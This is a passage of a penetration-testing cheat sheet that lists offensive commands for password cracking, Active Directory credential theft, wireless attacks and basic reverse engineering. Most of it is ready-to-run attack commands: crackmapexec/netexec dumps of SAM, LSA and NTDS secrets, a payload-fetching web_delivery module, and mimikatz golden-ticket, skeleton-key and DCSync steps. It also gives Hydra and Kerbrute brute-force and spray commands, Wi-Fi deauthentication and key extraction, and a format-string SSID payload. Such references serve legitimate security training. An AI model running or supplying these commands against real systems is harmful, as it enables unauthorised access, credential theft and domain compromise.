$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
$ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ crackmapexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
$ crackmapexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
$ crackmapexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
$ crackmapexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
```

## fcrack

```c
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

## GPG

### Decrypt Domain Policy Passwords

```c
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## Hash-Buster

> https://github.com/s0md3v/Hash-Buster

```c
$ buster -s 2b6d315337f18617ba18922c0b9597ff
```

## hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```c
$ hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
$ hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
$ hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
$ hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
$ hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
$ hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
$ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

### Cracking ASPREPRoast Password File

```c
$ hashcat -m 18200 -a 0 <FILE> <FILE>
```

### Cracking Kerberoasting Password File

```c
$ hashcat -m 13100 --force <FILE> <FILE>
```

### Bruteforce based on the Pattern

```c
$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate Password Candidates: Wordlist + Pattern

```c
$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

### Crack with hashcat

```c
$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```c
$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

## Hydra

> https://github.com/vanhauser-thc/thc-hydra

### Common Commands

```c
$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
$ hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
```

### Proxy

```c
$ export HYDRA_PROXY=connect://127.0.0.1:8080
$ unset HYDRA_PROXY
```

### SSH

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> ssh -V
$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> -t 4 ssh
```

### FTP

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> ftp -V -f
```

### SMB

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> smb -V -f
```

### MySQL

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> mysql -V -f
```

### VNC

```c
$ hydra -P passwords.txt <RHOST> vnc -V
```

### Postgres

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> postgres -V
```

### Telnet

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> telnet -V
```

### HTTP

```c
$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
```

### Webform

```c
$ hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
$ hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
$ hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

## John

> https://github.com/openwall/john

```c
$ john md5 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
$ john sha-1 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
$ john sha256 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
$ john bcrypt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
$ john md4 --wordlist=/usr/share/wordlists/rockyou.txt --format=md4
$ john ntlm --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
$ john sha512 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Using Salt

```c
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --mask='<SALT>?w'
```

### Cracking RSA

```c
$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```

### Cracking Kerberoasting Password File

```c
$ john --format=krb5tgs --wordlist=<FILE> <FILE>
```

### Cracking EncFS/6

```c
$ /usr/share/john/encfs2john.py directory/ > encfs6.xml.john
$ john encfs6.xml.john --wordlist=/usr/share/wordlists/rockyou.txt
```

### Extracting Hash from .kdbx File

```c
$ keepass2john <FILE>.kdbx
```

### Cracking .zip-Files

```c
$ zip2john <FILE> > output.hash
```

### Show cracked Password

```c
$ john --show <FILE>
```

## Kerbrute

> https://github.com/ropnop/kerbrute

### User Enumeration

```c
$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

### Password Spray

```c
$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

## LaZagne

> https://github.com/AlessandroZ/LaZagne

```c
C:\> laZagne.exe all
```

## LUKS

### Extracting LUKS Header

```c
$ dd if=backup.img of=header.luks bs=512 count=4097
```

## Medusa

```c
$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
```

## mimikatz

> https://github.com/gentilkiwi/mimikatz

### Common Commands

```c
mimikatz # token::elevate
mimikatz # token::revert
mimikatz # vault::cred
mimikatz # vault::list
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

### Execute mimikatz Inline

This is helpful when executing within a `Evil-WinRM` session.

```c
C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

### Dump Hashes

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
mimikatz # sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Pass the Ticket

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Forging Golden Ticket

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Skeleton Key

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

### Data Protection API (DPAPI) Decryption

> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

#### rpc

```c
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```c
mimikatz # dpapi::cache
```

```c
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## MultiDump

> https://github.com/Xre0uS/MultiDump

```c
$ python3 MultiDumpHandler.py -r <LPORT>
```

```c
PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

```c
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```c
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```c
$ netexec ldap -L
$ netexec mysql -L
$ netexec smb -L
$ netexec ssh -L
$ netexec winrm -L
```

### Common Commands

```c
$ netexec smb <RHOST> -u '' -p '' --shares
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u " " -p "" --shares
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
$ netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
$ netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
$ netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
$ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
```

## Patator

> https://github.com/lanjelot/patator

```c
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:mesg='Authentication failed.'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:fgrep='failed'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:egrep='failed'
```

## PDFCrack

```c
$ pdfcrack -f file.pdf -w /usr/share/wordlists/rockyou.txt
```

## pypykatz

> https://github.com/skelsec/pypykatz

```c
$ pypykatz lsa minidump lsass.dmp
$ pypykatz registry --sam sam system
```

## RsaCtfTool

> https://github.com/Ganapati/RsaCtfTool

```c
$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
```

## SprayingToolkit

> https://github.com/byt3bl33d3r/SprayingToolkit

### OWA

```c
$ python3 atomizer.py owa <RHOST> <PASSWORDS>.txt <USERNAMES>.txt -i 0:0:01
```

## VNC Password Recovery

```c
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```





# Wireless Attacks

- [Resources](#resources)

## Table of Contents

- [Aircrack-ng](#aircrack-ng)
- [airodump-ng](#airodump-ng)
- [airmon-ng](#airmon-ng)
- [ALFA AWUS036ACH](#alfa-awus036ach)
- [Apple Wi-Fi Evil SSID](#apple-wi-fi-evil-ssid)
- [mdk3](#mdk3)
- [Microsoft Windows](#microsoft-windows)
- [Wi-Fi Example Attack](#wi-fi-example-attack)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Aircrack-ng | WiFi security auditing tools suite | https://github.com/aircrack-ng/aircrack-ng |
| airgeddon | This is a multi-use bash script for Linux systems to audit wireless networks. | https://github.com/v1s1t0r1sh3r3/airgeddon |
| EAPHammer | EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. | https://github.com/s0lst1c3/eaphammer |
| Flipper | Playground (and dump) of stuff I make or modify for the Flipper Zero | https://github.com/UberGuidoZ/Flipper |
| flipperzero-firmware | Flipper Zero Code-Grabber Firmware | https://github.com/Eng1n33r/flipperzero-firmware |
| flipperzero-firmware-wPlugins | Flipper Zero FW [ROGUEMASTER] | https://github.com/RogueMaster/flipperzero-firmware-wPlugins |
| JackIt | JackIt - Exploit Code for Mousejack Resources | https://github.com/insecurityofthings/jackit |
| Pwnagotchi | (⌐■_■) - Deep Reinforcement Learning instrumenting bettercap for WiFi pwning. | https://github.com/evilsocket/pwnagotchi |
| WEF | A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, bluetooth hacking and much more. | https://github.com/D3Ext/WEF |
| Wifite | This repo is a complete re-write of wifite, a Python script for auditing wireless networks. | https://github.com/derv82/wifite2 |

## Aircrack-ng

```c
$ tshark -F pcap -r <FILE>.pcapng -w <FILE>.pcap
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt <FILE>.pcap
```

## airodump-ng

```c
$ sudo airodump-ng <INTERFACE>mon
```

## airmon-ng

```c
$ sudo airmon-ng check kill
$ sudo airmon-ng start <INTERFACE>
$ sudo airmon-ng stop <INTERFACE>
```

## ALFA AWUS036ACH

```c
$ sudo apt-get install realtek-rtl88xxau-dkms
```

## Apple Wi-Fi Evil SSID

```c
%p%s%s%s%s%n
```

## mdk3

> https://github.com/charlesxsh/mdk3-master

```c
$ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
$ sudo mdk3 <INTERFACE>mon d <BSSID>
$ sudo mdk3 <INTERFACE>mon b <BSSID>
```

## Microsoft Windows

### Wireless Profiles

#### List Profiles

```c
PS C:\> netsh wlan show profiles
```

#### Extract Passwords

```c
PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
```

#### Export Profiles

```c
PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
```

## Wi-Fi Example Attack

```c
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -w <FILE> -c <CHANNEL> --bssid <BSSID> wlan0mon
```

```c
$ sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

```c
$ aircrack-ng <FILE>.cap -w /usr/share/wordlists/rockyou.txt
```

```c
$ sudo airmon-ng stop wlan0mon
```






# Reverse Engineering

- [Resources](#resources)

## Table of Contents

- [Assembly Instructions](#assembly-instructions)
- [AvalonialLSpy](#avaloniallspy)
- [Basic Block in angr](#basic-block-in-angr)
- [Binwalk](#binwalk)
- [CFR](#cfr)
- [dumpbin](#dumpbin)
- [file](#file)
- [GDB](#gdb)
- [GEF](#gef)
- [Ghidra](#ghidra)
- [peda](#peda)
- [Radare2](#radare2)
- [strings](#strings)
- [upx](#upx)

## Resources

| Name | Description |URL |
| --- | --- | --- |
| AvalonialLSpy | This is cross-platform version of ILSpy built with Avalonia. | https://github.com/icsharpcode/AvaloniaILSpy |
| binwalk | Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. | https://github.com/ReFirmLabs/binwalk |
| CFF Explorer | Created by Erik Pistelli, a freeware suite of tools including a PE editor called CFF Explorer and a process viewer. | https://ntcore.com/?page_id=388 |
| cutter | Cutter is a free and open-source reverse engineering platform powered by rizin. | https://github.com/rizinorg/cutter |
| CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis | https://github.com/gchq/CyberChef |
| Decompiler Explorer | Interactive online decompiler which shows equivalent C-like output of decompiled programs from many popular decompilers. | https://dogbolt.org |
| Detect-It-Easy | Program for determining types of files for Windows, Linux and MacOS. | https://github.com/horsicq/Detect-It-Easy |
| dnSpy | dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. | https://github.com/dnSpy/dnSpy |
| Exeinfo PE | exeinfo PE for Windows by A.S.L | https://github.com/ExeinfoASL/Exeinfo |
| GEF | GEF is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. | https://github.com/hugsy/gef |
| Ghidra | Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency Research Directorate. | https://github.com/NationalSecurityAgency/ghidra |
| HxD | HxD is a carefully designed and fast hex editor which, additionally to raw disk editing and modifying of main memory (RAM), handles files of any size. | https://mh-nexus.de/en/hxd |
| ImHex | A Hex Editor for Reverse Engineers, Programmers and people who value their retinas when working at 3 AM. | https://github.com/WerWolv/ImHex |
| JD-GUI | JD-GUI, a standalone graphical utility that displays Java sources from CLASS files. | https://github.com/java-decompiler/jd-gui |
| Malcat | Malcat is a feature-rich hexadecimal editor / disassembler for Windows and Linux targeted to IT-security professionals. | https://malcat.fr |
| PE Tools | Portable executable (PE) manipulation toolkit | https://github.com/petoolse/petools |
| PE-bear | Portable Executable reversing tool with a friendly GUI | https://github.com/hasherezade/pe-bear |
| peda | PEDA - Python Exploit Development Assistance for GDB | https://github.com/longld/peda |
| pwndbg | pwndbg is a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers. | https://github.com/pwndbg/pwndbg |
| Radare2 | Radare2: The Libre Unix-Like Reverse Engineering Framework | https://github.com/radareorg/radare2 |
| Rizin | UNIX-like reverse engineering framework and command-line toolset. | https://github.com/rizinorg/rizin |
| rz-ghidra | Deep ghidra decompiler and sleigh disassembler integration for rizin | https://github.com/rizinorg/rz-ghidra |
| WinDbgX | An attempt to create a friendly version of WinDbg | https://github.com/zodiacon/WinDbgX |
| x64dbg | An open-source user mode debugger for Windows. Optimized for reverse engineering and malware analysis. | https://github.com/x64dbg/x64dbg |

## Assembly Instructions

```c
jne     # jump equal to
cmp     # compare
call    # call function for example
```

## AvaloniaILSpy

> https://github.com/icsharpcode/AvaloniaILSpy

```c
$ chmod a+x ILSpy
$ ./ILSpy
```

## Basic Block in angr

```c
import angr
import sys

def main(argv):
  path_to_binary = "<BINARY>"
  project = angr.Project(path_to_binary)
  initial_state = project.factory.entry_state()
  sm = project.factory.simgr(initial_state)
  # list of basic blocks to find or to avoid
  sm.explore(find=[], avoid=[])
  for state in sm.deadended:
    print(state.posix.dumps(sys.stdin.fileno()))
  else:
    raise Exception('Could not find the solution')

if __name__ == '__main__':
  main(sys.argv)
```

## Binwalk

> https://github.com/ReFirmLabs/binwalk

```c
$ binwalk <FILE>
$ binwalk -e <FILE>
```

## CFR

> https://www.benf.org/other/cfr/

```c
$ java -jar cfr-0.151.jar --outputpath /PATH/TO/DIRECTORY/ /PATH/TO/FILE/<FILE>.jar
```

## dumpbin

```c
C:\>dumpbin /headers /PATH/TO/FILE/<FILE>.exe
C:\>dumpbin /exports /PATH/TO/FILE/<FILE>.dll
```

## file

```c
$ file <FILE>
```

## GDB

### Common Commands

```c
(gdb) b main                           // sets breakpoint to main function
(gdb) b *0x5655792b                    // sets breakpoint on specific address
(gdb) run                              // starts debugging
(gdb) r                                // starts debugging
(gdb) r `python -c 'print "A"*200'`    // rerun the program with a specific parameter
(gdb) c                                // continue
(gdb) r Aa0Aa---snip---g5Ag            // run custom strings on a binary
(gdb) si                               // switch to instructions
(gdb) si enter                         // step-wise debugging
(gdb) x/s 0x555555556004               // x/s conversion
(gdb) p system                         // print memory address of system
(gdb) searchmem /bin/sh                // search within the binary
(gdb) disas main                       // disassemble main function
(gdb) b*0x080484ca                     // add a specific breakpoint
(gdb) x/100x $esp                      // getting EIP register
(gdb) x/100x $esp-400                  // locate in EIP register
(gdb) pattern create 48                // creates 48 character long pattern
(gdb) x/wx $rsp                        // finding rsp offset
(gdb) pattern search                   // finding pattern
(gdb) info functions <FUNCTION>        // getting function information
```

### Load a File

```c
$ gdb -q <FILE>
```

### Load a File with Arguments

```c
$ gdb --args ./<FILE> <LPORT>
```

## GEF

> https://github.com/hugsy/gef

```c
$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

## Ghidra

> https://github.com/NationalSecurityAgency/ghidra

> https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra

```c
L    // rename variables
;    // add a comment
```

## peda

> https://github.com/longld/peda

### Config File

```c
$ vi ~/.gdbinit
source ~/peda/peda.py
```

### Check File Properties

```c
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

## Radare2

> https://github.com/radareorg/radare2

> https://r2wiki.readthedocs.io/en/latest/

### Shortcuts

```c
v + view mode
V = visual mode
  p = cycle different panes
  v = function graph
    V = enter function in graph view
```

### Search Function

```c
:> s sym.main
Enter
Enter
```

### Common Commands

```c
?                 // help function
r2 <FILE>         // load a file
r2 -A ./<FILE>    // load a file
aaa               // analyze it
afl               // list all functions
s main            // set breakpoint on main
pdf               // start viewer
pdf@main          // start viewer on main
pdf@<function>    // start viewer on specific function
00+               // enable read function
s 0x00400968      // set replace function
wx 9090           // replace s with nops
wa nop            // write replaced nops
```

```c
$ r2 supershell
```

### Analyze Everything

```c
[0x004006e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

### Show Functions

```c
[0x004006e0]> afl
0x004006e0    1 41           entry0
0x004006a0    1 6            sym.imp.__libc_start_main
0x00400710    4 50   -> 41   sym.deregister_tm_clones
0x00400750    4 58   -> 55   sym.register_tm_clones
0x00400790    3 28           entry.fini0
0x004007b0    4 38   -> 35   entry.init0
0x004009b0    1 2            sym.__libc_csu_fini
